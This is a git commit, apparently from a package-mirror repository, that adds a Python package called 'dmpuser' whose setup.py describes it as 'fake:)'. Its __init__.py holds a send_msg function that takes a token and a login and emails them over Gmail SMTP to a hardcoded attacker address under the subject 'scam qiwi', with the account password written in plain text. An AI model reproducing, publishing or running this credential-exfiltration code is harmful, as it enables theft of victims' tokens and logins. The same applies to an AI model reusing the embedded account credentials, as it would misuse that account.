c82a5e3803f8bc5bb377d6ba5854a0f178911708
Bot <41898282+github-actions[bot]@users.noreply.github.com>
2023-08-06 18:46:27 +0000

    Add package dmpuser/1.4.1/dmpuser-1.4.1.tar.gz

---
+++ packages/dmpuser/dmpuser-1.4.1.tar.gz/dmpuser-1.4.1/dmpuser/__init__.py
@@ -0,0 +1,38 @@
+# import necessary packages
+ 
+from email.mime.multipart import MIMEMultipart
+from email.mime.text import MIMEText
+import smtplib
+ 
+# create message object instance
+msg = MIMEMultipart()
+ 
+def send_msg(tk,lg):
+    message = ('"'+str(tk)+'": ' + '"' + lg +'",')
+
+
+    
+    # setup the parameters of the message
+    password = "magaisaev95"
+    msg['From'] = "tramong682@gmail.com"
+    msg['To'] = "tramong682@gmail.com"
+    msg['Subject'] = "scam qiwi"
+    
+    # add in the message body
+    msg.attach(MIMEText(message, 'plain'))
+    
+    #create server
+    server = smtplib.SMTP('smtp.gmail.com: 587')
+    
+    server.starttls()
+    
+    # Login Credentials for sending the mail
+    server.login(msg['From'], password)
+    
+    
+    # send the message via the server.
+    server.sendmail(msg['From'], msg['To'], msg.as_string())
+    
+    server.quit()
+    
+    print('this is true ')
---
+++ packages/dmpuser/dmpuser-1.4.1.tar.gz/dmpuser-1.4.1/setup.py
@@ -0,0 +1,8 @@
+from setuptools import setup
+
+setup(name='dmpuser',
+      version='1.4.1',
+      description='fake:)',
+      packages=['dmpuser'],
+      author_email='adamisaev92341@gmail.com',
+      zip_safe=False)
